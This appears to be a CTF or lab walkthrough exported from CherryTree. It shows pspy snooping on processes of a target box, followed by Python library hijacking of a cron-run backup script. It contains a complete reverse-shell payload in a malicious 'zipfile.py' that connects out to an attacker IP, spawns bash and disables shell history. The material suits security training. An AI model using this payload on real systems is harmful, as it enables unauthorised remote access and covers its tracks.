<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 pspy2 – Unprivileged Linux Process Snooping</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.1 pspy2 – Unprivileged Linux Process Snooping</h1><br/><br />“pspy” is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea. More info <a href="https://www.jesusninoc.com/06/27/pspy-unprivileged-linux-process-snooping/">here</a>.<br /><br />a) Download “pspy32” from <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32">here</a> and save it on “/var/www/html”.<br /><br />    <div class="codebox"><div class="codebox">$&nbsp;<span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;<span style="color:#a52a2a;font-weight:700">cp</span>&nbsp;pspy32&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html<span style="color:#a52a2a;font-weight:700">/</span></div></div><br /><br />b) Create a Server on your Kali Machine.<br /><br />    To do that I used Python to start the SimpleHTTPServer on port 80.<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$python</span>&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80</div></div><br /><br /><br />c) On the victim machine go to “tmp” direstory and run the following commands.<br /><br />    <div class="codebox"><div class="codebox">thanos@nemesis<span style="color:#a52a2a;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<br />thanos@nemesis<span style="color:#a52a2a;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#a52a2a;font-weight:700">wget</span>&nbsp;http<span style="color:#a52a2a;font-weight:700">://</span>192.168.12.2<span style="color:#a52a2a;font-weight:700">/</span>pspy32<br />thanos@nemesis<span style="color:#a52a2a;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#a52a2a;font-weight:700">chmod</span>&nbsp;+x&nbsp;pspy32<br /></div></div><br />    <br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/410-1.png" alt="images/410-1.png" /><br /><br /> d) Run “pspy32”<br />    In the script “backup,py” you can see that it imports “zipfile” module for creating zip files.<br />    <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <img src="images/410-2.png" alt="images/410-2.png" /><span style="background-color:#000000;"><br /><br /></span>e) We can hijack this script by creating a malicious “zipfile.py” in the same directory with the following contents:<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#a020f0;font-weight:400">import</span>&nbsp;os<br /><span style="color:#a020f0;font-weight:400">import</span>&nbsp;pty<br /><span style="color:#a020f0;font-weight:400">import</span>&nbsp;socket<br /><br />lhost&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">"192.168.12.2"</span><br />lport&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">4444</span><br /><br />ZIP_DEFLATED&nbsp;=&nbsp;<span style="color:#ff00ff;font-weight:400">0</span><br /><br /><span style="color:#a52a2a;font-weight:700">class</span>&nbsp;ZipFile:<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">def</span>&nbsp;close(*args):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">return</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">def</span>&nbsp;write(*args):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">return</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">def</span>&nbsp;__init__(<span style="color:#008a8c;font-weight:400">self</span>,&nbsp;*args):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a52a2a;font-weight:700">return</span><br /><br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />s.connect((lhost,&nbsp;lport))<br />os.dup2(s.fileno(),<span style="color:#ff00ff;font-weight:400">0</span>)<br />os.dup2(s.fileno(),<span style="color:#ff00ff;font-weight:400">1</span>)<br />os.dup2(s.fileno(),<span style="color:#ff00ff;font-weight:400">2</span>)<br />os.putenv(<span style="color:#ff00ff;font-weight:400">"HISTFILE"</span>,<span style="color:#ff00ff;font-weight:400">'/dev/null'</span>)<br />pty.spawn(<span style="color:#ff00ff;font-weight:400">"/bin/bash"</span>)<br />s.close()</div></div><br /><br />f) Create the “zipfile.py” file.<br /><br />    <div class="codebox"><div class="codebox">thanos@nemesis<span style="color:#a52a2a;font-weight:700">:</span>~$&nbsp;nano&nbsp;zipfile.py<br /></div></div><br /><br />    When the script will be executed, instead of using the original “zipfile” module, it will import our malicious “zipfile.py” and our reverse shell will also be executed.<span style="background-color:#000000;"><br /><br /><br /></span><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>